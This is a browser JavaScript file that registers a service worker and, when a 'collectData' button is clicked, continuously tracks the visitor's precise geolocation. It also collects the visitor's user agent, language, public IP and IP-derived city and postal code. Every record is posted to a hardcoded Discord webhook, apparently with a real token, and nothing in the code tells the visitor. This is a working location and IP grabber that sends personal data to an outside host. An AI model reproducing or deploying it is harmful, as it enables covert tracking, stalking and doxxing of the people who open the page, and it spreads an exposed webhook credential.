// Register the service worker
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('sw.js').then(
      (registration) => {
        console.log('ServiceWorker registration successful with scope:', registration.scope);
      },
      (err) => {
        console.log('ServiceWorker registration failed:', err);
      }
    );
  });
}

document.getElementById('collectData').addEventListener('click', () => {
  if ('geolocation' in navigator) {
    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        const userData = await collectUserData(latitude, longitude);
        sendToDiscordWebhook(userData);
      },
      (error) => {
        console.error('Error obtaining location:', error);
      },
      {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0,
      }
    );
  } else {
    console.error('Geolocation is not supported by your browser.');
  }
});

async function collectUserData(latitude, longitude) {
  const userAgent = navigator.userAgent;
  const language = navigator.language;

  const ipResponse = await fetch('https://api.ipify.org?format=json');
  const ipData = await ipResponse.json();
  const { ip } = ipData;

  const locationResponse = await fetch(`https://ipinfo.io/${ip}/json`);
  const locationData = await locationResponse.json();
  const { city, region, country, postal } = locationData;

  return {
    userAgent,
    language,
    ip,
    city,
    region,
    country,
    postal,
    latitude,
    longitude,
  };
}

function sendToDiscordWebhook(userData) {
  // Replace with your Discord webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/1154687564322717696/nk2SyiAWN9JcCJbmNG2Sdu9ktGXVnA1vHdyQki3-vaiZRrrnp7Wt-Xqxv2F48HV5uPsk';

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: `User data:\n\`\`\`json\n${JSON.stringify(userData, null, 2)}\n\`\`\``,
    }),
  });
}
